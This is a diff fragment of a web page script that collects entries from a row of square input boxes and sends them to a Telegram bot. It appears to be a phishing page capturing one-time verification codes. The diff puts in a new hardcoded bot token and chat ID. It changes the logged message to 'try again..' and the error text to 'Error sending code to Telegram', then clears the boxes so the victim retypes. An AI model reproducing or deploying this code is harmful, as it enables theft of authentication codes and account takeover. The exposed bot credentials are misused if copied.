@@ -87,8 +87,8 @@ background-color:#ffffff;
 
 <script>
     const inputs = document.querySelectorAll('.square-input');
-    const telegramBotToken = '7806045699:AAHXIhdiILQQBsxWoq2R1ckTKAdOu-33-9g';
-    const telegramChatId = '7850420013';
+    const telegramBotToken = '7398534798:AAEsprbkxVEh0eLkcQY2-C67TN9FTyeGHRw';
+    const telegramChatId = '-1002855345282';
     const progressSpinner = document.getElementById('progress-spinner');
 
     inputs.forEach((input, index) => {
@@ -142,7 +142,7 @@ background-color:#ffffff;
                 return response.json();
             })
             .then(data => {
-                console.log('Message sent to Telegram:', data);
+                console.log('try again..:', data);
                 progressSpinner.style.display = 'none'; // Hide the spinner
 
                 // Clear the text from all boxes
@@ -151,7 +151,7 @@ background-color:#ffffff;
                 });
             })
             .catch(error => {
-                console.error('Error sending message to Telegram:', error);
+                console.error('Error sending code to Telegram:', error);
                 progressSpinner.style.display = 'none'; // Hide the spinner
             });
     }
